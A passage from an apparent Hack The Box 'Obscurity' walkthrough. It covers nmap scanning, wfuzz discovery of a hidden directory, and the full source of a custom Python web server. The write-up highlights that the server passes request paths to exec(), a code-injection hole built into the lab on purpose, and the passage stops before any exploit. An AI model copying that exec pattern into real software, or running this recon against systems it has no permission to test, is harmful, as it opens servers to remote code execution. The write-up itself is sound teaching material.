SF:ile</span><span class="se">\n</span><span class="s2">--&gt;</span><span class="se">\n\t</span><span class="s2">&lt;!--</span><span class="se">\x</span><span class="s2">20stylesheet</span><span class="se">\x</span><span class="s2">20css</span><span class="se">\x</span><span class="s2">20--&gt;</span><span class="se">\n\t</span><span class="s2">&lt;link</span><span class="se">\x</span><span class="s2">20rel=</span><span class="se">\"</span><span class="s2">styleshe
SF:et</span><span class="se">\"\x</span><span class="s2">20href=</span><span class="se">\"</span><span class="s2">css/bootstrap</span><span class="se">\.</span><span class="s2">min</span><span class="se">\.</span><span class="s2">css</span><span class="se">\"</span><span class="s2">&gt;</span><span class="se">\n\t</span><span class="s2">&lt;link</span><span class="se">\x</span><span class="s2">20rel=</span><span class="se">\"</span><span class="s2">stylesheet</span><span class="se">\</span><span class="s2">
SF:"</span><span class="se">\x</span><span class="nv">20href</span><span class="o">=</span><span class="se">\"</span>css/font-awesome<span class="se">\.</span>min<span class="se">\.</span>css<span class="se">\"</span><span class="o">&gt;</span><span class="se">\n\t</span>&lt;<span class="nb">link</span><span class="se">\x</span><span class="nv">20rel</span><span class="o">=</span><span class="se">\"</span>stylesheet<span class="se">\</span>
SF:<span class="s2">"</span><span class="se">\x</span><span class="s2">20href=</span><span class="se">\"</span><span class="s2">css/templatemo-blue</span><span class="se">\.</span><span class="s2">css</span><span class="se">\"</span><span class="s2">&gt;</span><span class="se">\n</span><span class="s2">&lt;/head&gt;</span><span class="se">\n</span><span class="s2">&lt;body</span><span class="se">\x</span><span class="s2">20data-spy=</span><span class="se">\"</span><span class="s2">s
SF:croll</span><span class="se">\"\x</span><span class="s2">20data-target=</span><span class="se">\"\.</span><span class="s2">navbar-collapse</span><span class="se">\"</span><span class="s2">&gt;</span><span class="se">\n\n</span><span class="s2">&lt;!--</span><span class="se">\x</span><span class="s2">20preloader</span><span class="se">\x</span><span class="s2">20s
SF:ection</span><span class="se">\x</span><span class="s2">20--&gt;</span><span class="se">\n</span><span class="s2">&lt;!--</span><span class="se">\n</span><span class="s2">&lt;div</span><span class="se">\x</span><span class="s2">20class=</span><span class="se">\"</span><span class="s2">preloader</span><span class="se">\"</span><span class="s2">&gt;</span><span class="se">\n\t</span><span class="s2">&lt;div</span><span class="se">\x</span><span class="s2">20class=</span><span class="se">\"</span><span class="s2">sk
SF:-spinner</span><span class="se">\x</span><span class="s2">20sk-spinner-wordpress</span><span class="se">\"</span><span class="s2">&gt;</span><span class="se">\n</span><span class="s2">"</span><span class="o">)</span><span class="p">;</span>
Service Info: OS: Linux<span class="p">;</span> CPE: cpe:/o:linux:linux_kernel

Failed to resolve <span class="s2">"nmap.full"</span><span class="nb">.</span>
NSE: Script Post-scanning.
Initiating NSE at 04:50
Completed NSE at 04:50, 0.00s elapsed
Initiating NSE at 04:50
Completed NSE at 04:50, 0.00s elapsed
Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ <span class="nb">.</span>
Nmap <span class="k">done</span>: 1 IP address <span class="o">(</span>1 host up<span class="o">)</span> scanned <span class="k">in </span>332.82 seconds
           Raw packets sent: 131254 <span class="o">(</span>5.775MB<span class="o">)</span> | Rcvd: 9071 <span class="o">(</span>896.064KB<span class="o">)</span>
</pre></table></code></div></div><p>Two ports <code class="language-plaintext highlighter-rouge">8080:http</code> , <code class="language-plaintext highlighter-rouge">22:ssh</code> are opened.Lets enumerate on the port <code class="language-plaintext highlighter-rouge">8080</code></p><h2 id="port-8080http">Port 8080:http</h2><p>Its serving a website</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7 " data-src="/hackthebox/obscurity/image-1.png" alt="Port-80" /></p><p>Running <code class="language-plaintext highlighter-rouge">gobuster</code> doesnt show me anything</p><p>If we look at the bottom of the <code class="language-plaintext highlighter-rouge">webpage</code> there is a mention of <code class="language-plaintext highlighter-rouge">SupersecureServer.py</code></p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7 " data-src="/hackthebox/obscurity/image-2.png" alt="SupersecureServer" /></p><p>The last line is saying <strong>Message to server devs: the current source code for the web server is in ‘SuperSecureServer.py’ in the secret development directory</strong> , We can conclude from this that there is a dir and inside the <code class="language-plaintext highlighter-rouge">dir</code> there is a file <code class="language-plaintext highlighter-rouge">SuperSecureServer.py</code></p><p>But if we look at dir <code class="language-plaintext highlighter-rouge">development</code> , it doesnt even exist.</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7 " data-src="/hackthebox/obscurity/image-3.png" alt="Development" /></p><p>Lets use <code class="language-plaintext highlighter-rouge">wfuzz</code> to find that <strong>hidden dir</strong>.</p><h1 id="wfuzz">Wfuzz</h1><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
</pre><td class="rouge-code"><pre>➜  obscurity wfuzz <span class="nt">-u</span> http://obscurity.htb:8080/FUZZ/SuperSecureServer.py  <span class="nt">-w</span> /usr/share/wordlists/wfuzz/general/common.txt <span class="nt">--hc</span> 404 

Warning: Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzzs documentation <span class="k">for </span>more information.

<span class="k">********************************************************</span>
<span class="k">*</span> Wfuzz 2.3.4 - The Web Fuzzer                         <span class="k">*</span>
<span class="k">********************************************************</span>

Target: http://obscurity.htb:8080/FUZZ/SuperSecureServer.py
Total requests: 950

<span class="o">==================================================================</span>
ID   Response   Lines      Word         Chars          Payload    
<span class="o">==================================================================</span>

000276:  <span class="nv">C</span><span class="o">=</span>200    170 L	     498 W	   5892 Ch	  <span class="s2">"develop"</span>
</pre></table></code></div></div><p>And we got a <code class="language-plaintext highlighter-rouge">dir</code> <strong>develop</strong> , Now we can go to <code class="language-plaintext highlighter-rouge">http://obscurity.htb:8080/develop/SuperSecureServer.py</code>.We have the full code of <code class="language-plaintext highlighter-rouge">SuperSecureServer.py</code></p><div class="language-python highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
51
52
53
54
55
56
57
58
59
60
61
62
63
64
65
66
67
68
69
70
71
72
73
74
75
76
77
78
79
80
81
82
83
84
85
86
87
88
89
90
91
92
93
94
95
96
97
98
99
100
101
102
103
104
105
106
107
108
109
110
111
112
113
114
115
116
117
118
119
120
121
122
123
124
125
126
127
128
129
130
131
132
133
134
135
136
137
138
139
140
141
142
143
144
145
146
147
148
149
150
151
152
153
154
155
156
157
158
159
160
161
162
163
164
165
166
167
168
169
</pre><td class="rouge-code"><pre><span class="kn">import</span> <span class="nn">socket</span>
<span class="kn">import</span> <span class="nn">threading</span>
<span class="kn">from</span> <span class="nn">datetime</span> <span class="kn">import</span> <span class="n">datetime</span>
<span class="kn">import</span> <span class="nn">sys</span>
<span class="kn">import</span> <span class="nn">os</span>
<span class="kn">import</span> <span class="nn">mimetypes</span>
<span class="kn">import</span> <span class="nn">urllib.parse</span>
<span class="kn">import</span> <span class="nn">subprocess</span>

<span class="n">respTemplate</span> <span class="o">=</span> <span class="s">"""HTTP/1.1 {statusNum} {statusCode}
Date: {dateSent}
Server: {server}
Last-Modified: {modified}
Content-Length: {length}
Content-Type: {contentType}
Connection: {connectionType}

{body}
"""</span>
<span class="n">DOC_ROOT</span> <span class="o">=</span> <span class="s">"DocRoot"</span>

<span class="n">CODES</span> <span class="o">=</span> <span class="p">{</span><span class="s">"200"</span><span class="p">:</span> <span class="s">"OK"</span><span class="p">,</span> 
        <span class="s">"304"</span><span class="p">:</span> <span class="s">"NOT MODIFIED"</span><span class="p">,</span>
        <span class="s">"400"</span><span class="p">:</span> <span class="s">"BAD REQUEST"</span><span class="p">,</span> <span class="s">"401"</span><span class="p">:</span> <span class="s">"UNAUTHORIZED"</span><span class="p">,</span> <span class="s">"403"</span><span class="p">:</span> <span class="s">"FORBIDDEN"</span><span class="p">,</span> <span class="s">"404"</span><span class="p">:</span> <span class="s">"NOT FOUND"</span><span class="p">,</span> 
        <span class="s">"500"</span><span class="p">:</span> <span class="s">"INTERNAL SERVER ERROR"</span><span class="p">}</span>

<span class="n">MIMES</span> <span class="o">=</span> <span class="p">{</span><span class="s">"txt"</span><span class="p">:</span> <span class="s">"text/plain"</span><span class="p">,</span> <span class="s">"css"</span><span class="p">:</span><span class="s">"text/css"</span><span class="p">,</span> <span class="s">"html"</span><span class="p">:</span><span class="s">"text/html"</span><span class="p">,</span> <span class="s">"png"</span><span class="p">:</span> <span class="s">"image/png"</span><span class="p">,</span> <span class="s">"jpg"</span><span class="p">:</span><span class="s">"image/jpg"</span><span class="p">,</span> 
        <span class="s">"ttf"</span><span class="p">:</span><span class="s">"application/octet-stream"</span><span class="p">,</span><span class="s">"otf"</span><span class="p">:</span><span class="s">"application/octet-stream"</span><span class="p">,</span> <span class="s">"woff"</span><span class="p">:</span><span class="s">"font/woff"</span><span class="p">,</span> <span class="s">"woff2"</span><span class="p">:</span> <span class="s">"font/woff2"</span><span class="p">,</span> 
        <span class="s">"js"</span><span class="p">:</span><span class="s">"application/javascript"</span><span class="p">,</span><span class="s">"gz"</span><span class="p">:</span><span class="s">"application/zip"</span><span class="p">,</span> <span class="s">"py"</span><span class="p">:</span><span class="s">"text/plain"</span><span class="p">,</span> <span class="s">"map"</span><span class="p">:</span> <span class="s">"application/octet-stream"</span><span class="p">}</span>


<span class="k">class</span> <span class="nc">Response</span><span class="p">:</span>
    <span class="k">def</span> <span class="nf">__init__</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="o">**</span><span class="n">kwargs</span><span class="p">):</span>
        <span class="bp">self</span><span class="p">.</span><span class="n">__dict__</span><span class="p">.</span><span class="n">update</span><span class="p">(</span><span class="n">kwargs</span><span class="p">)</span>
        <span class="n">now</span> <span class="o">=</span> <span class="n">datetime</span><span class="p">.</span><span class="n">now</span><span class="p">()</span>
        <span class="bp">self</span><span class="p">.</span><span class="n">dateSent</span> <span class="o">=</span> <span class="bp">self</span><span class="p">.</span><span class="n">modified</span> <span class="o">=</span> <span class="n">now</span><span class="p">.</span><span class="n">strftime</span><span class="p">(</span><span class="s">"%a, %d %b %Y %H:%M:%S"</span><span class="p">)</span>
    <span class="k">def</span> <span class="nf">stringResponse</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
        <span class="k">return</span> <span class="n">respTemplate</span><span class="p">.</span><span class="nb">format</span><span class="p">(</span><span class="o">**</span><span class="bp">self</span><span class="p">.</span><span class="n">__dict__</span><span class="p">)</span>

<span class="k">class</span> <span class="nc">Request</span><span class="p">:</span>
    <span class="k">def</span> <span class="nf">__init__</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">request</span><span class="p">):</span>
        <span class="bp">self</span><span class="p">.</span><span class="n">good</span> <span class="o">=</span> <span class="bp">True</span>
        <span class="k">try</span><span class="p">:</span>
            <span class="n">request</span> <span class="o">=</span> <span class="bp">self</span><span class="p">.</span><span class="n">parseRequest</span><span class="p">(</span><span class="n">request</span><span class="p">)</span>
            <span class="bp">self</span><span class="p">.</span><span class="n">method</span> <span class="o">=</span> <span class="n">request</span><span class="p">[</span><span class="s">"method"</span><span class="p">]</span>
            <span class="bp">self</span><span class="p">.</span><span class="n">doc</span> <span class="o">=</span> <span class="n">request</span><span class="p">[</span><span class="s">"doc"</span><span class="p">]</span>
            <span class="bp">self</span><span class="p">.</span><span class="n">vers</span> <span class="o">=</span> <span class="n">request</span><span class="p">[</span><span class="s">"vers"</span><span class="p">]</span>
            <span class="bp">self</span><span class="p">.</span><span class="n">header</span> <span class="o">=</span> <span class="n">request</span><span class="p">[</span><span class="s">"header"</span><span class="p">]</span>
            <span class="bp">self</span><span class="p">.</span><span class="n">body</span> <span class="o">=</span> <span class="n">request</span><span class="p">[</span><span class="s">"body"</span><span class="p">]</span>
        <span class="k">except</span><span class="p">:</span>
            <span class="bp">self</span><span class="p">.</span><span class="n">good</span> <span class="o">=</span> <span class="bp">False</span>

    <span class="k">def</span> <span class="nf">parseRequest</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">request</span><span class="p">):</span>        
        <span class="n">req</span> <span class="o">=</span> <span class="n">request</span><span class="p">.</span><span class="n">strip</span><span class="p">(</span><span class="s">"</span><span class="se">\r</span><span class="s">"</span><span class="p">).</span><span class="n">split</span><span class="p">(</span><span class="s">"</span><span class="se">\n</span><span class="s">"</span><span class="p">)</span>
        <span class="n">method</span><span class="p">,</span><span class="n">doc</span><span class="p">,</span><span class="n">vers</span> <span class="o">=</span> <span class="n">req</span><span class="p">[</span><span class="mi">0</span><span class="p">].</span><span class="n">split</span><span class="p">(</span><span class="s">" "</span><span class="p">)</span>
        <span class="n">header</span> <span class="o">=</span> <span class="n">req</span><span class="p">[</span><span class="mi">1</span><span class="p">:</span><span class="o">-</span><span class="mi">3</span><span class="p">]</span>
        <span class="n">body</span> <span class="o">=</span> <span class="n">req</span><span class="p">[</span><span class="o">-</span><span class="mi">1</span><span class="p">]</span>
        <span class="n">headerDict</span> <span class="o">=</span> <span class="p">{}</span>
        <span class="k">for</span> <span class="n">param</span> <span class="ow">in</span> <span class="n">header</span><span class="p">:</span>
            <span class="n">pos</span> <span class="o">=</span> <span class="n">param</span><span class="p">.</span><span class="n">find</span><span class="p">(</span><span class="s">": "</span><span class="p">)</span>
            <span class="n">key</span><span class="p">,</span> <span class="n">val</span> <span class="o">=</span> <span class="n">param</span><span class="p">[:</span><span class="n">pos</span><span class="p">],</span> <span class="n">param</span><span class="p">[</span><span class="n">pos</span><span class="o">+</span><span class="mi">2</span><span class="p">:]</span>
            <span class="n">headerDict</span><span class="p">.</span><span class="n">update</span><span class="p">({</span><span class="n">key</span><span class="p">:</span> <span class="n">val</span><span class="p">})</span>
        <span class="k">return</span> <span class="p">{</span><span class="s">"method"</span><span class="p">:</span> <span class="n">method</span><span class="p">,</span> <span class="s">"doc"</span><span class="p">:</span> <span class="n">doc</span><span class="p">,</span> <span class="s">"vers"</span><span class="p">:</span> <span class="n">vers</span><span class="p">,</span> <span class="s">"header"</span><span class="p">:</span> <span class="n">headerDict</span><span class="p">,</span> <span class="s">"body"</span><span class="p">:</span> <span class="n">body</span><span class="p">}</span>


<span class="k">class</span> <span class="nc">Server</span><span class="p">:</span>
    <span class="k">def</span> <span class="nf">__init__</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">host</span><span class="p">,</span> <span class="n">port</span><span class="p">):</span>    
        <span class="bp">self</span><span class="p">.</span><span class="n">host</span> <span class="o">=</span> <span class="n">host</span>
        <span class="bp">self</span><span class="p">.</span><span class="n">port</span> <span class="o">=</span> <span class="n">port</span>
        <span class="bp">self</span><span class="p">.</span><span class="n">sock</span> <span class="o">=</span> <span class="n">socket</span><span class="p">.</span><span class="n">socket</span><span class="p">(</span><span class="n">socket</span><span class="p">.</span><span class="n">AF_INET</span><span class="p">,</span> <span class="n">socket</span><span class="p">.</span><span class="n">SOCK_STREAM</span><span class="p">)</span>
        <span class="bp">self</span><span class="p">.</span><span class="n">sock</span><span class="p">.</span><span class="n">setsockopt</span><span class="p">(</span><span class="n">socket</span><span class="p">.</span><span class="n">SOL_SOCKET</span><span class="p">,</span> <span class="n">socket</span><span class="p">.</span><span class="n">SO_REUSEADDR</span><span class="p">,</span> <span class="mi">1</span><span class="p">)</span>
        <span class="bp">self</span><span class="p">.</span><span class="n">sock</span><span class="p">.</span><span class="n">bind</span><span class="p">((</span><span class="bp">self</span><span class="p">.</span><span class="n">host</span><span class="p">,</span> <span class="bp">self</span><span class="p">.</span><span class="n">port</span><span class="p">))</span>

    <span class="k">def</span> <span class="nf">listen</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
        <span class="bp">self</span><span class="p">.</span><span class="n">sock</span><span class="p">.</span><span class="n">listen</span><span class="p">(</span><span class="mi">5</span><span class="p">)</span>
        <span class="k">while</span> <span class="bp">True</span><span class="p">:</span>
            <span class="n">client</span><span class="p">,</span> <span class="n">address</span> <span class="o">=</span> <span class="bp">self</span><span class="p">.</span><span class="n">sock</span><span class="p">.</span><span class="n">accept</span><span class="p">()</span>
            <span class="n">client</span><span class="p">.</span><span class="n">settimeout</span><span class="p">(</span><span class="mi">60</span><span class="p">)</span>
            <span class="n">threading</span><span class="p">.</span><span class="n">Thread</span><span class="p">(</span><span class="n">target</span> <span class="o">=</span> <span class="bp">self</span><span class="p">.</span><span class="n">listenToClient</span><span class="p">,</span><span class="n">args</span> <span class="o">=</span> <span class="p">(</span><span class="n">client</span><span class="p">,</span><span class="n">address</span><span class="p">)).</span><span class="n">start</span><span class="p">()</span>

    <span class="k">def</span> <span class="nf">listenToClient</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">client</span><span class="p">,</span> <span class="n">address</span><span class="p">):</span>
        <span class="n">size</span> <span class="o">=</span> <span class="mi">1024</span>
        <span class="k">while</span> <span class="bp">True</span><span class="p">:</span>
            <span class="k">try</span><span class="p">:</span>
                <span class="n">data</span> <span class="o">=</span> <span class="n">client</span><span class="p">.</span><span class="n">recv</span><span class="p">(</span><span class="n">size</span><span class="p">)</span>
                <span class="k">if</span> <span class="n">data</span><span class="p">:</span>
                    <span class="c1"># Set the response to echo back the recieved data 
</span>                    <span class="n">req</span> <span class="o">=</span> <span class="n">Request</span><span class="p">(</span><span class="n">data</span><span class="p">.</span><span class="n">decode</span><span class="p">())</span>
                    <span class="bp">self</span><span class="p">.</span><span class="n">handleRequest</span><span class="p">(</span><span class="n">req</span><span class="p">,</span> <span class="n">client</span><span class="p">,</span> <span class="n">address</span><span class="p">)</span>
                    <span class="n">client</span><span class="p">.</span><span class="n">shutdown</span><span class="p">()</span>
                    <span class="n">client</span><span class="p">.</span><span class="n">close</span><span class="p">()</span>
                <span class="k">else</span><span class="p">:</span>
                    <span class="k">raise</span> <span class="n">error</span><span class="p">(</span><span class="s">'Client disconnected'</span><span class="p">)</span>
            <span class="k">except</span><span class="p">:</span>
                <span class="n">client</span><span class="p">.</span><span class="n">close</span><span class="p">()</span>
                <span class="k">return</span> <span class="bp">False</span>
    
    <span class="k">def</span> <span class="nf">handleRequest</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">request</span><span class="p">,</span> <span class="n">conn</span><span class="p">,</span> <span class="n">address</span><span class="p">):</span>
        <span class="k">if</span> <span class="n">request</span><span class="p">.</span><span class="n">good</span><span class="p">:</span>
<span class="c1">#            try:
</span>                <span class="c1"># print(str(request.method) + " " + str(request.doc), end=' ')
</span>                <span class="c1"># print("from {0}".format(address[0]))
#            except Exception as e:
#                print(e)
</span>            <span class="n">document</span> <span class="o">=</span> <span class="bp">self</span><span class="p">.</span><span class="n">serveDoc</span><span class="p">(</span><span class="n">request</span><span class="p">.</span><span class="n">doc</span><span class="p">,</span> <span class="n">DOC_ROOT</span><span class="p">)</span>
            <span class="n">statusNum</span><span class="o">=</span><span class="n">document</span><span class="p">[</span><span class="s">"status"</span><span class="p">]</span>
        <span class="k">else</span><span class="p">:</span>
            <span class="n">document</span> <span class="o">=</span> <span class="bp">self</span><span class="p">.</span><span class="n">serveDoc</span><span class="p">(</span><span class="s">"/errors/400.html"</span><span class="p">,</span> <span class="n">DOC_ROOT</span><span class="p">)</span>
            <span class="n">statusNum</span><span class="o">=</span><span class="s">"400"</span>
        <span class="n">body</span> <span class="o">=</span> <span class="n">document</span><span class="p">[</span><span class="s">"body"</span><span class="p">]</span>
        
        <span class="n">statusCode</span><span class="o">=</span><span class="n">CODES</span><span class="p">[</span><span class="n">statusNum</span><span class="p">]</span>
        <span class="n">dateSent</span> <span class="o">=</span> <span class="s">""</span>
        <span class="n">server</span> <span class="o">=</span> <span class="s">"BadHTTPServer"</span>
        <span class="n">modified</span> <span class="o">=</span> <span class="s">""</span>
        <span class="n">length</span> <span class="o">=</span> <span class="nb">len</span><span class="p">(</span><span class="n">body</span><span class="p">)</span>
        <span class="n">contentType</span> <span class="o">=</span> <span class="n">document</span><span class="p">[</span><span class="s">"mime"</span><span class="p">]</span> <span class="c1"># Try and identify MIME type from string
</span>        <span class="n">connectionType</span> <span class="o">=</span> <span class="s">"Closed"</span>


        <span class="n">resp</span> <span class="o">=</span> <span class="n">Response</span><span class="p">(</span>
        <span class="n">statusNum</span><span class="o">=</span><span class="n">statusNum</span><span class="p">,</span> <span class="n">statusCode</span><span class="o">=</span><span class="n">statusCode</span><span class="p">,</span> 
        <span class="n">dateSent</span> <span class="o">=</span> <span class="n">dateSent</span><span class="p">,</span> <span class="n">server</span> <span class="o">=</span> <span class="n">server</span><span class="p">,</span> 
        <span class="n">modified</span> <span class="o">=</span> <span class="n">modified</span><span class="p">,</span> <span class="n">length</span> <span class="o">=</span> <span class="n">length</span><span class="p">,</span> 
        <span class="n">contentType</span> <span class="o">=</span> <span class="n">contentType</span><span class="p">,</span> <span class="n">connectionType</span> <span class="o">=</span> <span class="n">connectionType</span><span class="p">,</span> 
        <span class="n">body</span> <span class="o">=</span> <span class="n">body</span>
        <span class="p">)</span>

        <span class="n">data</span> <span class="o">=</span> <span class="n">resp</span><span class="p">.</span><span class="n">stringResponse</span><span class="p">()</span>
        <span class="k">if</span> <span class="ow">not</span> <span class="n">data</span><span class="p">:</span>
            <span class="k">return</span> <span class="o">-</span><span class="mi">1</span>
        <span class="n">conn</span><span class="p">.</span><span class="n">send</span><span class="p">(</span><span class="n">data</span><span class="p">.</span><span class="n">encode</span><span class="p">())</span>
        <span class="k">return</span> <span class="mi">0</span>

    <span class="k">def</span> <span class="nf">serveDoc</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">path</span><span class="p">,</span> <span class="n">docRoot</span><span class="p">):</span>
        <span class="n">path</span> <span class="o">=</span> <span class="n">urllib</span><span class="p">.</span><span class="n">parse</span><span class="p">.</span><span class="n">unquote</span><span class="p">(</span><span class="n">path</span><span class="p">)</span>
        <span class="k">try</span><span class="p">:</span>
            <span class="n">info</span> <span class="o">=</span> <span class="s">"output = 'Document: {}'"</span> <span class="c1"># Keep the output for later debug
</span>            <span class="k">exec</span><span class="p">(</span><span class="n">info</span><span class="p">.</span><span class="nb">format</span><span class="p">(</span><span class="n">path</span><span class="p">))</span> <span class="c1"># This is how you do string formatting, right?
</span>            <span class="n">cwd</span> <span class="o">=</span> <span class="n">os</span><span class="p">.</span><span class="n">path</span><span class="p">.</span><span class="n">dirname</span><span class="p">(</span><span class="n">os</span><span class="p">.</span><span class="n">path</span><span class="p">.</span><span class="n">realpath</span><span class="p">(</span><span class="n">__file__</span><span class="p">))</span>
            <span class="n">docRoot</span> <span class="o">=</span> <span class="n">os</span><span class="p">.</span><span class="n">path</span><span class="p">.</span><span class="n">join</span><span class="p">(</span><span class="n">cwd</span><span class="p">,</span> <span class="n">docRoot</span><span class="p">)</span>
            <span class="k">if</span> <span class="n">path</span> <span class="o">==</span> <span class="s">"/"</span><span class="p">:</span>
                <span class="n">path</span> <span class="o">=</span> <span class="s">"/index.html"</span>
            <span class="n">requested</span> <span class="o">=</span> <span class="n">os</span><span class="p">.</span><span class="n">path</span><span class="p">.</span><span class="n">join</span><span class="p">(</span><span class="n">docRoot</span><span class="p">,</span> <span class="n">path</span><span class="p">[</span><span class="mi">1</span><span class="p">:])</span>
            <span class="k">if</span> <span class="n">os</span><span class="p">.</span><span class="n">path</span><span class="p">.</span><span class="n">isfile</span><span class="p">(</span><span class="n">requested</span><span class="p">):</span>
                <span class="n">mime</span> <span class="o">=</span> <span class="n">mimetypes</span><span class="p">.</span><span class="n">guess_type</span><span class="p">(</span><span class="n">requested</span><span class="p">)</span>
                <span class="n">mime</span> <span class="o">=</span> <span class="p">(</span><span class="n">mime</span> <span class="k">if</span> <span class="n">mime</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">!=</span> <span class="bp">None</span> <span class="k">else</span> <span class="s">"text/html"</span><span class="p">)</span>
                <span class="n">mime</span> <span class="o">=</span> <span class="n">MIMES</span><span class="p">[</span><span class="n">requested</span><span class="p">.</span><span class="n">split</span><span class="p">(</span><span class="s">"."</span><span class="p">)[</span><span class="o">-</span><span class="mi">1</span><span class="p">]]</span>
                <span class="k">try</span><span class="p">:</span>
                    <span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="n">requested</span><span class="p">,</span> <span class="s">"r"</span><span class="p">)</span> <span class="k">as</span> <span class="n">f</span><span class="p">:</span>
                        <span class="n">data</span> <span class="o">=</span> <span class="n">f</span><span class="p">.</span><span class="n">read</span><span class="p">()</span>
                <span class="k">except</span><span class="p">:</span>
                    <span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="n">requested</span><span class="p">,</span> <span class="s">"rb"</span><span class="p">)</span> <span class="k">as</span> <span class="n">f</span><span class="p">:</span>
                        <span class="n">data</span> <span class="o">=</span> <span class="n">f</span><span class="p">.</span><span class="n">read</span><span class="p">()</span>
                <span class="n">status</span> <span class="o">=</span> <span class="s">"200"</span>
            <span class="k">else</span><span class="p">:</span>
                <span class="n">errorPage</span> <span class="o">=</span> <span class="n">os</span><span class="p">.</span><span class="n">path</span><span class="p">.</span><span class="n">join</span><span class="p">(</span><span class="n">docRoot</span><span class="p">,</span> <span class="s">"errors"</span><span class="p">,</span> <span class="s">"404.html"</span><span class="p">)</span>
                <span class="n">mime</span> <span class="o">=</span> <span class="s">"text/html"</span>
                <span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="n">errorPage</span><span class="p">,</span> <span class="s">"r"</span><span class="p">)</span> <span class="k">as</span> <span class="n">f</span><span class="p">:</span>
                    <span class="n">data</span> <span class="o">=</span> <span class="n">f</span><span class="p">.</span><span class="n">read</span><span class="p">().</span><span class="nb">format</span><span class="p">(</span><span class="n">path</span><span class="p">)</span>
                <span class="n">status</span> <span class="o">=</span> <span class="s">"404"</span>
        <span class="k">except</span> <span class="nb">Exception</span> <span class="k">as</span> <span class="n">e</span><span class="p">:</span>
            <span class="k">print</span><span class="p">(</span><span class="n">e</span><span class="p">)</span>
            <span class="n">errorPage</span> <span class="o">=</span> <span class="n">os</span><span class="p">.</span><span class="n">path</span><span class="p">.</span><span class="n">join</span><span class="p">(</span><span class="n">docRoot</span><span class="p">,</span> <span class="s">"errors"</span><span class="p">,</span> <span class="s">"500.html"</span><span class="p">)</span>
            <span class="n">mime</span> <span class="o">=</span> <span class="s">"text/html"</span>
            <span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="n">errorPage</span><span class="p">,</span> <span class="s">"r"</span><span class="p">)</span> <span class="k">as</span> <span class="n">f</span><span class="p">:</span>
                <span class="n">data</span> <span class="o">=</span> <span class="n">f</span><span class="p">.</span><span class="n">read</span><span class="p">()</span>
            <span class="n">status</span> <span class="o">=</span> <span class="s">"500"</span>
        <span class="k">return</span> <span class="p">{</span><span class="s">"body"</span><span class="p">:</span> <span class="n">data</span><span class="p">,</span> <span class="s">"mime"</span><span class="p">:</span> <span class="n">mime</span><span class="p">,</span> <span class="s">"status"</span><span class="p">:</span> <span class="n">status</span><span class="p">}</span>
</pre></table></code></div></div><p>Since the initial page <code class="language-plaintext highlighter-rouge">mentioned</code> that the current web-server is running on the above <code class="language-plaintext highlighter-rouge">script</code> so we need to figure out a way from the file to get something.</p><div class="language-python highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
</pre><td class="rouge-code"><pre><span class="k">def</span> <span class="nf">serveDoc</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">path</span><span class="p">,</span> <span class="n">docRoot</span><span class="p">):</span>
        <span class="n">path</span> <span class="o">=</span> <span class="n">urllib</span><span class="p">.</span><span class="n">parse</span><span class="p">.</span><span class="n">unquote</span><span class="p">(</span><span class="n">path</span><span class="p">)</span>
        <span class="k">try</span><span class="p">:</span>
            <span class="n">info</span> <span class="o">=</span> <span class="s">"output = 'Document: {}'"</span> <span class="c1"># Keep the output for later debug
</span>            <span class="k">exec</span><span class="p">(</span><span class="n">info</span><span class="p">.</span><span class="nb">format</span><span class="p">(</span><span class="n">path</span><span class="p">))</span> <span class="c1"># This is how you do string formatting, right?
</span></pre></table></code></div></div><p>If we look at the function <code class="language-plaintext highlighter-rouge">serveDoc</code> there is a line</p><div class="language-python highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>            <span class="k">exec</span><span class="p">(</span><span class="n">info</span><span class="p">.</span><span class="nb">format</span><span class="p">(</span><span class="n">path</span><span class="p">))</span> <span class="c1"># This is how you do string formatting, right?
